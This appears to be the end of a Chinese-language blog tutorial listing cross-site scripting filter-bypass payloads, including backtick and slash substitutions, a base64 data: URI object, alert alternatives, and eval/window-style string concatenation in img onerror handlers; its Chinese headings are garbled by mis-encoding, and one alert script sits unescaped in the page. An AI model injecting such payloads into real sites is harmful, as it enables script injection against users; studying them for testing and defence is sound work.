<h3 id="åœ†æ‹¬å·è¿‡æ»¤çš„ç»•è¿‡"><a href="#åœ†æ‹¬å·è¿‡æ»¤çš„ç»•è¿‡" class="headerlink" title="åœ†æ‹¬å·è¿‡æ»¤çš„ç»•è¿‡"></a>åœ†æ‹¬å·è¿‡æ»¤çš„ç»•è¿‡</h3><p>åå¼•å·çš„æ›¿æ¢</p>
<script>alert`1`</script>

<p>dataåè®®ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiWHNzVGVzdCIpOzwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;</span><br></pre></td></tr></table></figure>

<h3 id="å•å¼•å·ç»•è¿‡"><a href="#å•å¼•å·ç»•è¿‡" class="headerlink" title="å•å¼•å·ç»•è¿‡"></a>å•å¼•å·ç»•è¿‡</h3><p>æ–œæ çš„æ›¿æ¢</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/1/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>åå¼•å·çš„æ›¿æ¢</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(`1`)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="alert-è¿‡æ»¤çš„ç»•è¿‡"><a href="#alert-è¿‡æ»¤çš„ç»•è¿‡" class="headerlink" title="alert()è¿‡æ»¤çš„ç»•è¿‡"></a>alert()è¿‡æ»¤çš„ç»•è¿‡</h3><p>promptæ›¿æ¢ï¼ˆ<code>prompt()</code> æ˜¯ JavaScript çš„ä¸€ä¸ªæ–¹æ³•ï¼Œå®ƒä¼šæ˜¾ç¤ºä¸€ä¸ªå¸¦æœ‰è¾“å…¥æ¡†çš„å¯¹è¯æ¡†ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;prompt(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>confirmæ›¿æ¢ï¼ˆ<code>confirm()</code> æ˜¾ç¤ºä¸€ä¸ªå¸¦æœ‰ç¡®å®š/å–æ¶ˆæŒ‰é’®çš„å¯¹è¯æ¡†ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;confirm(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>console.logæ›¿æ¢ï¼ˆ<code>console.log()</code> å°†å†…å®¹è¾“å‡ºåˆ°æµè§ˆå™¨æ§åˆ¶å°ï¼Œä¸ä¼šåœ¨é¡µé¢ä¸Šæ˜¾ç¤ºä»»ä½•å†…å®¹ï¼Œåªåœ¨å¼€å‘è€…å·¥å…·çš„æ§åˆ¶å°ä¸­å¯è§ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;console.log(3)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>document.write æ›¿æ¢ï¼ˆ<code>document.write()</code> ç›´æ¥å°†å†…å®¹å†™å…¥ HTML æ–‡æ¡£ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.write(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="å‡½æ•°æ‹¼æ¥"><a href="#å‡½æ•°æ‹¼æ¥" class="headerlink" title="å‡½æ•°æ‹¼æ¥"></a>å‡½æ•°æ‹¼æ¥</h3><p> eval</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;al&#x27;+&#x27;ert(1)&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p> top</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;top[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>window</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;window[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>self</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;self[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p> parent</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;parent[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>frames</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;frames[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>

        </div>
        
            <div class="post-container">
                <aside class="toc-container">
                    <button class="toc-toggle">æ–‡ç« ç›®å½•</button>
                    <nav class="toc" id="toc"></nav>
                </aside>
            </div>
        
    </div>
    
    <!-- è¯„è®ºç³»ç»Ÿ -->
    

    <!-- è¿”å›ä¸»é¡µé“¾æ¥ -->
    <div class="text-center my-8">
        <a href="/" class="text-hacker-color1 underline hover:text-hacker-color2">â† Back to Home</a>
    </div>

    <script src="/js/toc.js"></script>  <!-- å¼•å…¥ TOC é€»è¾‘ -->
    <footer class="bg-black text-gray-400 py-4">
    <div class="container mx-auto text-center">
      <p>Â© <span id="current-year"></span>  ycycyc 
        <br> Powered by <a class="hover:text-white duration-150 hover:underline decoration-slice" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a class="hover:text-white duration-150 hover:underline decoration-slice" target="_blank" rel="noopener" href="https://github.com/m310ct/hexo-theme-hexploit">Hexpolit</a></p>
    </div>
  </footer>
  
  <script> 
    document.getElementById("current-year").textContent = new Date().getFullYear();
  </script>
  

</body>
</html>